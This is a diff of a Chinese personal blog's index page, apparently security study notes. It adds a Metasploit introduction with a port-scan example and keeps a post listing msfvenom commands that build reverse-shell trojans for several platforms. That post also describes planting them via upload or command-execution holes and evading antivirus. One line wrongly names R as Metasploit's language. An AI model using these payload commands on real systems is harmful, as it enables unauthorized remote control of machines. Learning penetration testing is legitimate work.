@@ -227,6 +227,129 @@
             
 
   
+    <article id="post-metasploit 学习01" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2021/06/13/metasploit%20%E5%AD%A6%E4%B9%A001/">metasploit 学习01</a>
+	
+    </h1>
+  
+
+
+  
+  
+<a href="/2021/06/13/metasploit%20%E5%AD%A6%E4%B9%A001/" class="archive-article-date">
+        <time datetime="2021-06-12T16:58:27.668Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-13</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h2 id="metasploit-学习01"><a href="#metasploit-学习01" class="headerlink" title="metasploit 学习01"></a>metasploit 学习01</h2><p><strong>简介：</strong></p>
+<p>R语言编写的开源工具，模板化框架，有很好的扩展性。</p>
+<p><strong>模块介绍：</strong></p>
+<p>Auxiliaries(辅助模块):扫描、搜索漏洞</p>
+<p>Exploit(漏洞利用模块):漏洞利用</p>
+<p>Payload(攻击载荷模块):发送payload</p>
+<p>Post(后渗透模块):后渗透</p>
+<p>Encoders(编码工具模块):免杀、绕过</p>
+<p><strong>攻击步骤：</strong></p>
+<ol>
+<li>扫描目标系统寻找漏洞</li>
+<li>配置一个exp模块</li>
+<li>配置payload</li>
+<li>选择编码</li>
+<li>run</li>
+</ol>
+<p><strong>实例1：</strong>使用msf进行端口扫描（TCP探测）</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//代码如下</span><br><span class="line">msfconsole</span><br><span class="line">search portscan</span><br><span class="line">use auciliar/scanner/portscan/tcp</span><br><span class="line"><span class="built_in">set</span> rhosts xxx.xxx.xxx.xxx</span><br><span class="line"><span class="built_in">set</span> ports 1-10000</span><br><span class="line"><span class="built_in">set</span> threads 20</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>截图如下：</p>
+<p><img src="https://raw.githubusercontent.com/John-tlh/blog/master/imagesimage-20210612220039745.png" alt="image-20210612220039745"></p>
+<p>结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/John-tlh/blog/master/imagesimage-20210612220419180.png" alt="image-20210612220419180"></p>
+<p><strong>实例2：</strong>使用msf调用nmap进行服务探测、扫描</p>
+<p><img src="https://raw.githubusercontent.com/John-tlh/blog/master/imagesimage-20210612221119519.png" alt="image-20210612221119519"></p>
+    
+    <a class="article-more-a" href="/2021/06/13/metasploit%20%E5%AD%A6%E4%B9%A001/#more">more >></a>
+    
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">metasploit</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/06/13/metasploit%20%E5%AD%A6%E4%B9%A001/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-metasploit-学习02" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -260,14 +383,14 @@
 <p><strong>内容：</strong></p>
 <p>利用msfvenom生成木马并且反弹shell。</p>
 <p>首先介绍下msfvenon的基本用法：</p>
-<p><img src="https://raw.githubusercontent.com/John-tlh/blog/master/imagesimage-20210612232318514.png" alt="image-20210612232318514"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/image-20210613005623957.png" alt="image-20210613005623957"></p>
 <p>列举出常用的生成shell的命令：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">linux：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line"></span><br><span class="line">windows：</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">PHP:</span><br><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br><span class="line"></span><br><span class="line">ASP:</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br><span class="line"></span><br><span class="line">Python：</span><br><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br><span class="line"></span><br><span class="line">Bash：</span><br><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br><span class="line"></span><br><span class="line">Perl：</span><br><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>
 
 <p>木马生成后只要想办法放到目标机器下，根据目标机器的具体情况选择合适的方式下载并执行你的木马即可，然后就可以在攻击机上获取到反弹回来的shell了：</p>
 <p><strong>实例</strong></p>
 <p>首先生成木马</p>
-<p><img src="https://raw.githubusercontent.com/John-tlh/blog/master/imagesimage-20210612234307638.png" alt="image-20210612234307638"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/image-20210613005640652.png" alt="image-20210613005640652"></p>
 <p>然后在靶机上找到一个上传漏洞或者命令执行漏洞，下载或者上传我们生成的木马到靶机，这里我以命令执行为例：</p>
 <p>上传后木马一直被杀软杀掉，考虑用免杀马，未完……</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/106348527">https://blog.csdn.net/qq_36119192/article/details/106348527</a></p>
@@ -1085,65 +1208,6 @@
     
     <p class="article-more-link">
       <a class="article-more-a" href="/2021/05/06/java%E7%AC%94%E8%AE%B0/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-java内存区：" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="堆区："><a href="#堆区：" class="headerlink" title="堆区："></a>堆区：</h2><ol>
-<li>存储的全都是对象，每个对象都包含一个与之对应的class信息。</li>
-<li>JVM只有一个堆区被所有线程共享，堆中不存在基本类型和对象引用，只存放对象本身。</li>
-<li>Java的堆是一个运行时数据区,类的对象从中分配空间。这些对象通过new、newarray、anewarray和multianewarray等指令建立，它们不需要程序代码来显式的释放。堆是由垃圾回收来负责的，堆的优势是可以动态地分配内存大小，生存期也不必事先告诉编译器，因为它是在运行时动态分配内存的，Java的垃圾收集器会自动收走这些不再使用的数据。但缺点是，由于要在运行时动态分配内存，存取速度较慢.</li>
-</ol>
-<h2 id="栈区："><a href="#栈区：" class="headerlink" title="栈区："></a>栈区：</h2><ol>
-<li>每个线程包含一个栈区，栈中只保存基础数据类型的对象和自定义对象的引用（不是对象）</li>
-<li></li>
-</ol>
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/05/06/java%E5%86%85%E5%AD%98%E5%8C%BA%EF%BC%9A/">展开全文 >></a>
     </p>
     
 
